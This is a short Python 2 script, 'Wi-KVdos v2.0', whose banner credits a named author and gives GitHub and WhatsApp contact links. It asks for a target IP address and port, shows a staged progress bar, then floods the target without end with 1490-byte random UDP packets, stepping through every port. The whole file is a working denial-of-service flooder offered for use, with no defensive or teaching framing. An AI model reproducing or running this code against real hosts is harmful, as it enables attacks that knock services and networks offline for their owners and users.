print ("\033[92m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Wi-KVdos")
print (''' \033[92m
          .;' Mohammed Al -Ahmadi `;,
        .;'  ,;'             `;,  `;,   Wi-KVdos v2.0 (Mo-Ah)
       .;'  ,;'  ,;'     `;,  `;,  `;,
        ::   ::   :   ( )   :   ::   ::  Mohammed Al -Ahmadi
        ':.  ':.  ':. /_\ ,:'  ,:'  ,:'
         ':.  ':.    /___\    ,:'  ,:'   
          ':.       /_____\      ,:'    https://github.com/sojxk212
                   /       \

 "Coded By : Mr.BL4Z3"
 "Author   : Mohammed Al -Ahmadi"
 "Github   : https://github.com/sojxk212" "whatsapp  : https://api.whatsapp.com/send?phone=+967778239092"
 "whatsapp :https://api.whatsapp.com/send?phone=+967738325474"
 \033[0m''')
print("\033[96m")
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[96m")
os.system("figlet DdoS Attack")
print("Team : Mohammed Al -Ahmadi")
print ("\033[94m")
print "[                    ] 0% "
time.sleep(3)
print "[=====               ] 25%"
time.sleep(3)
print "[==========          ] 50%"
time.sleep(3)
print "[===============     ] 75%"
time.sleep(3)
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

